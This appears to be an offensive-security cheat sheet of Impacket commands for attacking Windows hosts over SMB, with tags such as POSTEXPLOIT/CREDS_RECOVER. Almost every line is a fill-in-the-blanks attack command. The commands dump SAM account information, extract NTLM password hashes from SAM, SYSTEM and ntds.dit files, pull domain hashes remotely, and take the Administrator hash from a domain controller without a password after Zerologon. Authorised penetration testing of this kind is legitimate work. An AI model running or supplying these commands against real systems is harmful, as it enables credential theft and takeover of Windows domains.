# Impacket

% impacket, windows, smb, 445

## samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-samrdump <domain>/<user>:<password>@<ip>
```

## secretsdump
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump '<domain>/<user>:<password>'@<ip>
```

## secretsdump local dump - extract hash from sam database
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## secretsdump local dump - extract hash from ntds.dit
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
```

## secretsdump - anonymous get administrator 
zerologon
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
```

## secretsdump - remote extract
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```

## secretsdump - remote extract + users infos
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```


